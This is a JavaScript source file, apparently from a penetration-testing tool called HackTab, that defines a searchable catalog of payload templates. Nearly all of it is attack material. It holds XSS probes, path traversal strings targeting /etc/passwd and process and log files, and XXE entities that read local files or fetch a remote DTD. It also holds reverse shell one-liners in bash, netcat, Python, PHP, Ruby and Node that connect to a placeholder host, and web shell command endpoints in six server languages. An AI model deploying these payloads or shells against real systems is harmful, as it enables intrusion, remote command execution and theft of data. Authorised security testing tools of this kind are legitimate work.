import {DB_PAYLOADS} from './payloads-db.js';
import {EXTRA_PAYLOADS} from './payloads-extra.js';
import {CURATED_PAYLOADS} from './payloads-curated.js';

// Plain text templates. Rendering and insertion never evaluate payload content.
const entries = [];
function group(category, section, rows) {
  for (const [label, template] of rows) entries.push({id: `base-${entries.length + 1}`, category, section, label, template});
}

group('XSS', 'Context checks', [
  ['Script element', '<script>alert(1)</script>'], ['Attribute breakout', '"><img src=x onerror=alert(1)>'],
  ['Image error', '<img src=x onerror=alert(1)>'], ['SVG load', '<svg onload=alert(1)>'],
  ['SVG compact', '<svg/onload=alert(1)>'], ['Focus event', '<input autofocus onfocus=alert(1)>'],
  ['Details toggle', '<details open ontoggle=alert(1)>'], ['Video error', '<video><source onerror=alert(1)></video>'],
  ['Textarea breakout', '</textarea><svg onload=alert(1)>'], ['Title breakout', '</title><svg onload=alert(1)>'],
  ['Single quote JS breakout', "';alert(1);//"], ['Double quote JS breakout', '";alert(1);//'],
  ['Template literal check', '${alert(1)}'], ['JavaScript URL', 'javascript:alert(1)'],
  ['HTML marker', '<hacktab-probe>marker</hacktab-probe>']
]);
group('LFI', 'Paths', [
  ['Unix passwd', '/etc/passwd'], ['Unix hosts', '/etc/hosts'], ['Windows INI', 'C:\\Windows\\win.ini'],
  ['Configured file', '{{file}}'], ['Traversal', '../../../../../../{{relative_file}}'],
  ['Nested traversal', '....//....//....//{{relative_file}}'], ['Encoded traversal', '..%2f..%2f..%2f{{relative_file}}'],
  ['Double encoded traversal', '%252e%252e%252f%252e%252e%252f{{relative_file}}'],
  ['Backslash traversal', '..\\..\\..\\Windows\\win.ini'], ['Encoded backslash', '..%5c..%5c..%5cWindows%5cwin.ini'],
  ['Null suffix (legacy)', '{{file}}%00']
]);
group('LFI', 'Wrappers / process / logs', [
  ['PHP base64 filter', 'php://filter/convert.base64-encode/resource={{file}}'],
  ['PHP ROT13 filter', 'php://filter/read=string.rot13/resource={{file}}'],
  ['PHP input', 'php://input'], ['Process environment', '/proc/self/environ'], ['Process command', '/proc/self/cmdline'],
  ['Process status', '/proc/self/status'], ['Process descriptor', '/proc/self/fd/0'],
  ['Apache access log', '/var/log/apache2/access.log'], ['Apache error log', '/var/log/apache2/error.log'],
  ['Nginx access log', '/var/log/nginx/access.log'], ['Nginx error log', '/var/log/nginx/error.log'],
  ['HTTPD access log', '/var/log/httpd/access_log'], ['Auth log', '/var/log/auth.log'],
  ['XAMPP configuration', 'C:\\xampp\\apache\\conf\\httpd.conf']
]);
group('XXE', 'XML templates', [
  ['Internal entity probe', '<?xml version="1.0"?>\n<!DOCTYPE probe [<!ENTITY marker "HackTab">]>\n<probe>&marker;</probe>'],
  ['External file entity', '<?xml version="1.0"?>\n<!DOCTYPE probe [<!ENTITY file SYSTEM "file://{{file}}">]>\n<probe>&file;</probe>'],
  ['PHP base64 entity', '<?xml version="1.0"?>\n<!DOCTYPE probe [<!ENTITY file SYSTEM "php://filter/convert.base64-encode/resource={{file}}">]>\n<probe>&file;</probe>'],
  ['External DTD template', '<?xml version="1.0"?>\n<!DOCTYPE probe SYSTEM "http://{{host}}:{{port}}/probe.dtd">\n<probe>marker</probe>'],
  ['XInclude template', '<probe xmlns:xi="http://www.w3.org/2001/XInclude"><xi:include parse="text" href="file://{{file}}"/></probe>']
]);
group('Shells', 'Reverse shell templates', [
  ['Bash TCP', "bash -c 'bash -i >& /dev/tcp/{{host}}/{{port}} 0>&1'"],
  ['Netcat exec', 'nc {{host}} {{port}} -e /bin/sh'],
  ['Netcat FIFO', 'mkfifo /tmp/hacktab-pipe; /bin/sh -i < /tmp/hacktab-pipe 2>&1 | nc {{host}} {{port}} > /tmp/hacktab-pipe'],
  ['Python 3', "python3 -c 'import os,socket,subprocess;s=socket.socket();s.connect((\"{{host}}\",{{port}}));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];subprocess.call([\"/bin/sh\",\"-i\"])'"],
  ['PHP socket', "php -r '$s=fsockopen(\"{{host}}\",{{port}});$p=proc_open(\"/bin/sh\",array(0=>$s,1=>$s,2=>$s),$pipes);'"],
  ['Ruby socket', "ruby -rsocket -e 's=TCPSocket.new(\"{{host}}\",{{port}});exec \"/bin/sh -i\",in:s,out:s,err:s'"],
  ['Node.js socket', "node -e 'const s=require(\"net\").connect({{port}},\"{{host}}\"),p=require(\"child_process\").spawn(\"/bin/sh\",[\"-i\"]);s.pipe(p.stdin);p.stdout.pipe(s);p.stderr.pipe(s)'"],
  ['Listener', 'nc -lvnp {{port}}']
]);
group('Shells', 'Server command templates', [
  ['PHP command endpoint', '<?php if (isset($_POST["cmd"])) { passthru($_POST["cmd"]); } ?>'],
  ['ASP command endpoint', '<% If Request.Form("cmd") <> "" Then Response.Write(Server.CreateObject("WScript.Shell").Exec("cmd.exe /c " & Request.Form("cmd")).StdOut.ReadAll()) %>'],
  ['JSP command endpoint', '<%@ page import="java.io.*" %><% String cmd=request.getParameter("cmd"); if(cmd!=null){ Process p=new ProcessBuilder("/bin/sh","-c",cmd).start(); out.print(new String(p.getInputStream().readAllBytes())); } %>'],
  ['ASPX command endpoint', '<%@ Page Language="C#" %><%@ Import Namespace="System.Diagnostics" %><script runat="server">void Page_Load(object s, EventArgs e){if(Request.Form["cmd"]!=null){var p=Process.Start(new ProcessStartInfo("cmd.exe","/c "+Request.Form["cmd"]){RedirectStandardOutput=true,UseShellExecute=false});Response.Write(Server.HtmlEncode(p.StandardOutput.ReadToEnd()));}}</script>'],
  ['Perl CGI command endpoint', '#!/usr/bin/perl\nuse CGI; my $q=CGI->new; print $q->header("text/plain"); my $cmd=$q->param("cmd"); if(defined $cmd){ print scalar qx{$cmd}; }'],
  ['CFML command template', '<cfif structKeyExists(form,"cmd")><cfexecute name="/bin/sh" arguments="-c &quot;#form.cmd#&quot;" variable="result" timeout="5" /><cfoutput>#encodeForHTML(result)#</cfoutput></cfif>']
]);
group('Templates', 'Request bodies', [
  ['JSON object', '{\n  "name": "{{selected}}"\n}'], ['XML document', '<?xml version="1.0"?>\n<request><value>{{selected}}</value></request>'],
  ['Form parameters', 'name={{selected}}&value=1'], ['GraphQL body', '{"query":"query { __typename }"}']
]);
group('Templates', 'Server-side expression checks', [
  ['JSON boolean value', '{"enabled":true}'], ['JSON null value', '{"value":null}'],
  ['XML CDATA probe', '<probe><![CDATA[<marker>&value]]></probe>']
]);

const catalog = [...DB_PAYLOADS, ...entries, ...EXTRA_PAYLOADS, ...CURATED_PAYLOADS];
export const PAYLOADS = Object.freeze([
  ...catalog.filter(entry => entry.category === 'Templates'),
  ...catalog.filter(entry => entry.category !== 'Templates')
].map(entry => Object.freeze(entry)));
export const CATEGORIES = ['All', ...new Set(PAYLOADS.map(entry => entry.category))];
export function searchPayloads(query = '', category = 'All') {
  const words = query.toLowerCase().trim().split(/\s+/).filter(Boolean);
  return PAYLOADS.filter(entry => (category === 'All' || entry.category === category) && words.every(word => `${entry.label} ${entry.section} ${entry.category} ${entry.template}`.toLowerCase().includes(word)));
}
